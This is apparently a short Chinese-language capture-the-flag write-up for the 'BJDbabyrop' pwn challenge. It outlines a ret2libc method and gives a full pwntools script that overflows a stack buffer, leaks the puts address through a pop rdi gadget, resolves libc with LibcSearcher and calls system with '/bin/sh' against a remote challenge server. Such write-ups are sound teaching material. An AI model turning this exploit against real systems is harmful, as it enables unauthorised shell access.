我们首先拿到题目，发现没有后门函数，没有我们的 rop 链，栈不可执行，于是我们需要考虑使用我们的 ret 2 libc。我们只需要按照我们的标准流程执行


第零步：确定 libc 版本

第一步：找到我们的 pop_rdi

第一步：找 libc 基地址

第二步：构造我们的 libc 数值。

在这里，我们难点在于我们的第 0 部，如果我们没有确定我们 libc 版本的，我们就需要用我们的 libcsearcher 来协助我们进行我们的工作。
```
from pwn import *
from LibcSearcher import *
ex = "./BJDbabyrop"
#p = process(ex)
p = remote("1.14.71.254",28221)
elf = ELF(ex)
libc = ELF("libc-2.23.soo")

pop_rdi = 0x0000000000400733

pay1 = b"a"*0x20 + p64(0) + p64(pop_rdi)+ p64(elf.got["puts"]) + p64(elf.plt["puts"]) + p64(elf.sym["main"])

p.sendline(pay1)

puts = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))

libc = LibcSearcher("puts",puts)
libc_base = puts - libc.dump("puts")
success("libc: " + hex(libc_base))

pay2 = b"a"*0x20 + p64(0) + p64(pop_rdi )+ p64(libc_base +libc.dump("str_bin_sh")) + p64(libc_base+ libc.dump("system")) 

p.sendline(pay2)

p.interactive()
```